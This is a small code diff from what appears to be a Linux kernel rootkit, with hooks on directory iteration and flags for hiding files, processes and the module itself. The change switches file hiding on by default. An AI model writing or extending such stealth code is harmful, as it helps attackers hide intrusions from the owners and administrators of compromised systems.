@@ -22,7 +22,7 @@ static int (*fs_iterate_orig)(struct file *, struct dir_context *);
 static int size, temp;
 static int current_pid = 0;
 
-static char hide_files = 0;
+static char hide_files = 1;
 static char hide_module = 0;
 static char module_status[1024];
 static char pids_to_hide[MAX_PIDS][8];
